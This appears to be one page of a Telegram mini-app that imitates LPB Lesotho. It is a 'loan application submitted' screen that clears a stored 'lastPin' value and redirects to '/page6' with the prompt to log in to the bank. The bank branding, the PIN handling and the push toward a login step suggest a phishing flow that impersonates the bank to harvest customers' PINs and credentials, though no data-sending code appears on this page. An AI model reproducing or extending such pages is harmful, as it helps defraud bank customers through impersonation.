<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Application Submitted - LPB Lesotho</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --lpb-blue: #0054a6;        /* LPB Royal Blue */
            --lpb-blue-dark: #003e7e;
            --lpb-green: #00a651;       /* LPB Vibrant Green */
            --lpb-green-dark: #008541;
            --lpb-gold: #a38228;        /* LPB Ochre/Gold Accent */
            --lpb-dark: #121820;        /* Deep Dark Header & Text */
            --bg-color: #f4f7fa;
            --card-bg: #ffffff;
            --text-dark: #121820;
            --text-muted: #666666;
            --btn-soft-bg: #eef5fc;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            position: relative;
        }

        /* Top Floating Toast Notification */
        .toast-notification {
            position: absolute;
            top: 25px;
            background-color: var(--lpb-blue);
            border-bottom: 3px solid var(--lpb-green);
            color: #ffffff;
            padding: 12px 20px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 8px 24px rgba(0, 84, 166, 0.2);
            z-index: 100;
            font-size: 14px;
            font-weight: 600;
            line-height: 1.3;
        }

        .toast-icon {
            width: 24px;
            height: 24px;
            background-color: var(--lpb-green);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            font-size: 14px;
            font-weight: 900;
            flex-shrink: 0;
        }

        /* Main Card Container */
        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 420px;
            margin-top: 45px;
            padding: 40px 24px 35px;
            border-radius: 24px;
            box-shadow: 0 6px 25px rgba(0, 84, 166, 0.08);
            border: 1px solid #e6eef7;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Circle Checkmark Banner */
        .check-circle {
            width: 88px;
            height: 88px;
            background: linear-gradient(135deg, var(--lpb-blue) 0%, #0066cc 100%);
            border: 4px solid var(--lpb-green);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 28px;
            color: #ffffff;
            font-size: 40px;
            font-weight: 900;
            box-shadow: 0 4px 20px rgba(0, 84, 166, 0.3);
        }

        .main-title {
            font-size: 26px;
            color: var(--lpb-blue);
            margin: 0 0 20px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .message-text {
            color: var(--text-muted);
            font-size: 15px;
            margin: 0 0 16px;
            line-height: 1.55;
            max-width: 320px;
        }

        /* Redirection Container Button & Spinner */
        .redirect-box {
            background-color: var(--btn-soft-bg);
            border: 1px solid #cce0f5;
            border-radius: 12px;
            padding: 16px 20px;
            margin: 20px 0 16px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            color: var(--lpb-blue);
            font-weight: 700;
            font-size: 15px;
        }

        .spinner {
            width: 18px;
            height: 18px;
            border: 2.5px solid #d9e4f0;
            border-top: 2.5px solid var(--lpb-green);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Bottom Outline Action Button */
        .btn-outline {
            background-color: transparent;
            color: var(--lpb-blue);
            border: 2px solid #cce0f5;
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s, border-color 0.2s;
        }

        .btn-outline:hover {
            background-color: #eef5fc;
            border-color: var(--lpb-blue);
        }

        .btn-outline:active {
            background-color: #e2edf8;
            border-color: var(--lpb-green);
        }
    </style>
</head>

<body>

<!-- Top Floating Toast Notification -->
<div class="toast-notification">
    <div class="toast-icon">✓</div>
    <div>🎉 Application<br>submitted successfully!</div>
</div>

<!-- Card Container -->
<div class="card">
    <!-- Big Circle Checkmark Indicator -->
    <div class="check-circle">✓</div>

    <!-- Title & Descriptions -->
    <h1 class="main-title">Application Submitted</h1>

    <p class="message-text">
        Your loan application has been successfully submitted. Please wait for approval.
    </p>

    <p class="message-text">
        You will receive a confirmation message. Log in to LPB Lesotho to continue.
    </p>

    <!-- Redirect Countdown Box -->
    <div class="redirect-box">
        <div class="spinner"></div>
        <span>Redirecting in <span id="timer">3</span>s...</span>
    </div>

    <!-- Secondary Login Button -->
    <button type="button" class="btn-outline" onclick="goToPage6()">
        Log In Now
    </button>
</div>

<script>
    let timeLeft = 3;
    let interval;

    function updateTimer() {
        const el = document.getElementById('timer');
        if (el) el.textContent = timeLeft;
    }

    function goToPage6() {
        if (interval) clearInterval(interval);

        // Clear temporary PIN storage before redirecting
        localStorage.removeItem('lastPin');
        
        window.location.href = "/page6";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        updateTimer();

        interval = setInterval(() => {
            timeLeft--;

            if (timeLeft <= 0) {
                clearInterval(interval);
                goToPage6();
                return;
            }

            updateTimer();
        }, 1000);
    };
</script>

</body>
</html>
